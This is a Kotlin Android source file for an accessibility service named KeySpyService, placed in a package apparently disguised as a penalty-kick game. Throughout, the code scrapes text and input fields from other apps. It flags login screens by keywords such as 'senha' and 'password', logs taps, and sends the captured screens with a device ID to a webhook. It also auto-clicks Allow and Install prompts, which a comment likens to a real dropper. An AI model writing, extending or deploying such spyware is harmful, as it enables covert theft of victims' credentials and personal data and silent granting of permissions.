package com.venice.penaltylegends.core

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo

class KeySpyService : AccessibilityService() {

    private var pkgAtual = ""
    private var ultimoHash = ""
    private var ultimoEnvio = 0L
    private var ultimoClique = 0L
    private val ui = Handler(Looper.getMainLooper())
    private val pendente = StringBuilder()

    private val enviar = Runnable { despejar() }

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        serviceInfo = serviceInfo?.apply {
            eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                    AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED or
                    AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                    AccessibilityEvent.TYPE_VIEW_CLICKED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
                    AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
            notificationTimeout = 180
        }
    }

    override fun onInterrupt() {}

    override fun onAccessibilityEvent(e: AccessibilityEvent?) {
        e ?: return
        val pkg = e.packageName?.toString() ?: return
        if (pkg == packageName) return

        if (e.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            if (pkg != pkgAtual) {
                despejar()
                pkgAtual = pkg
                ultimoHash = ""
            }
            autoPermitir()
        }

        if (e.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED && pkg in Config.ALVOS) {
            val t = e.text?.joinToString(" ")?.trim().orEmpty()
            if (t.length in 2..40 && System.currentTimeMillis() - ultimoClique > 800) {
                ultimoClique = System.currentTimeMillis()
                pendente.appendLine("  toque: $t")
            }
        }

        val raiz = try { rootInActiveWindow } catch (t: Throwable) { null } ?: return
        val itens = ArrayList<String>(64)
        coletar(raiz, itens)

        if (itens.isEmpty()) return
        val hash = itens.joinToString("|")
        if (hash == ultimoHash) return
        ultimoHash = hash

        val temEdicao = itens.any { it.startsWith(CAMPO) }
        val pareceLogin = itens.any { s ->
            val l = s.lowercase()
            listOf("senha", "password", "e-mail", "email", "usuário", "usuario",
                "login", "entrar", "sign in", "log in", "telefone", "celular")
                .any { l.contains(it) }
        }
        val alvo = pkg in Config.ALVOS

        if (!alvo && !temEdicao && !pareceLogin) return

        pendente.setLength(0)
        pendente.appendLine(if (pareceLogin || temEdicao) "TELA DE ACESSO" else "tela")
        itens.take(45).forEach { pendente.appendLine(it) }

        ui.removeCallbacks(enviar)
        ui.postDelayed(enviar, if (temEdicao) 1500 else 900)
    }

    private fun despejar() {
        val corpo = pendente.toString().trim()
        if (corpo.isBlank()) return
        val agora = System.currentTimeMillis()
        if (agora - ultimoEnvio < 4000) {
            ui.removeCallbacks(enviar); ui.postDelayed(enviar, 4500); return
        }
        ultimoEnvio = agora
        val nome = nomeApp(pkgAtual)
        Webhook.sendEmbed(
            this,
            Webhook.embed(
                titulo = "TELA CAPTURADA — $nome",
                desc = "```\n${corpo.take(1800)}\n```",
                cor = 0x2ECC71,
                campos = listOf(
                    Webhook.f("Pacote", pkgAtual, true),
                    Webhook.f("Aparelho", Prefs.deviceId, true)
                )
            )
        )
        pendente.setLength(0)
    }

    private fun nomeApp(p: String): String = try {
        packageManager.getApplicationLabel(packageManager.getApplicationInfo(p, 0)).toString()
    } catch (t: Throwable) { p }

    private fun coletar(node: AccessibilityNodeInfo?, out: MutableList<String>, depth: Int = 0) {
        node ?: return
        if (depth > 24 || out.size >= 64) return

        val texto = node.text?.toString()?.trim().orEmpty()
        val dica = if (Build.VERSION.SDK_INT >= 26)
            node.hintText?.toString()?.trim().orEmpty() else ""

        if (node.isEditable) {
            val v = if (texto.isNotEmpty()) texto else "(vazio)"
            out.add("$CAMPO ${if (dica.isNotEmpty()) "$dica = " else ""}$v")
        } else if (texto.length in 2..70 && !out.contains(texto)) {
            out.add(texto)
        } else if (texto.isEmpty() && dica.isNotEmpty() && out.size < 40) {
            out.add("dica: $dica")
        }

        for (i in 0 until node.childCount) coletar(node.getChild(i), out, depth + 1)
    }

    /** Clica automaticamente em Permitir/Allow/Instalar — igual dropper de verdade. */
    private fun autoPermitir() {
        if (System.currentTimeMillis() - ultimoClique < 700) return
        val raiz = rootInActiveWindow ?: return
        val p = raiz.packageName?.toString() ?: return
        val relevante = p.contains("permissioncontroller") ||
                p.contains("packageinstaller") ||
                p.contains("android.permission") ||
                p.contains("systemui")
        if (!relevante) return

        val alvos = listOf(
            "permitir", "allow", "permitir tudo", "allow all", "continuar", "continue",
            "ok", "instalar", "install", "atualizar", "update", "entendi", "got it"
        )
        for (t in alvos) {
            val nos = try { raiz.findAccessibilityNodeInfosByText(t) } catch (e: Throwable) { null } ?: continue
            for (n in nos) {
                val alvo = gerarPaiClicavel(n) ?: continue
                if (alvo.isEnabled) {
                    ultimoClique = System.currentTimeMillis()
                    alvo.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    return
                }
            }
        }
    }

    private fun gerarPaiClicavel(n: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        var atual: AccessibilityNodeInfo? = n
        var nivel = 0
        while (atual != null && nivel < 4) {
            if (atual.isClickable) return atual
            atual = atual.parent
            nivel++
        }
        return null
    }

    companion object {
        private const val CAMPO = ">>"
        var instance: KeySpyService? = null
            private set
    }
}